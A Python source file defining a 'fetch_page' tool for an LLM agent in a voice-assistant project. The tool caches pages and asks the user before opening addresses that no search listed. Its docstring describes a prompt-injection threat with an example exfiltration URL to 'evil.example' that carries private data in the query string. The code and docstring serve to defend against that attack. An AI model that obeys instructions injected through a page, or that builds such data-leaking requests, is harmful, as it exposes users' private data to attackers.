"""Read a web page (cache-first by URL) and store it in research memory.

A page that the user's search did not list is opened only with the user's permission: a
malicious page could otherwise make the model request ``https://evil.example/?d=<private
data>`` and so carry data out in the address. :class:`~voicemate.agent.tools.research.Research`
enforces that; this tool supplies the question to ask.
"""

from __future__ import annotations

from urllib.parse import urlsplit

from langchain_core.runnables import RunnableConfig
from langchain_core.tools import BaseTool, StructuredTool

from voicemate.agent.hitl import ask_user, is_affirmative
from voicemate.agent.tools.base import ToolContext, format_date, report
from voicemate.agent.tools.search import UNTRUSTED_NOTE

#: Maximum characters of page text returned to the model in one call.
MAX_RETURN_CHARS: int = 6000


def _ask_to_open(url: str) -> str | None:
    """Ask the user whether to open an unlisted address; None means yes, else their words."""
    host = urlsplit(url).hostname or url
    answer = ask_user(f"Open {host}? It was not in a search result.")
    return None if is_affirmative(answer) else answer


def build(ctx: ToolContext) -> list[BaseTool]:
    """Create the ``fetch_page`` tool."""

    async def fetch_page(url: str, config: RunnableConfig) -> str:
        """Read the main text of a web page or online PDF (use after web_search for details).

        Args:
            url: Full http(s) URL.
        """
        page = await ctx.research.page(url, _ask_to_open)
        if page.from_memory:
            report(config, "fetch_page", {"url": url}, "memory", url)
            header = f"[from memory, retrieved {format_date(page.retrieved_at or 0)}]"
        else:
            report(config, "fetch_page", {"url": url}, "web", url)
            header = f"[fetched {url}]"
        return f"{header} {UNTRUSTED_NOTE}\n{page.text[:MAX_RETURN_CHARS]}"

    return [
        StructuredTool.from_function(coroutine=fetch_page, name="fetch_page", parse_docstring=True)
    ]
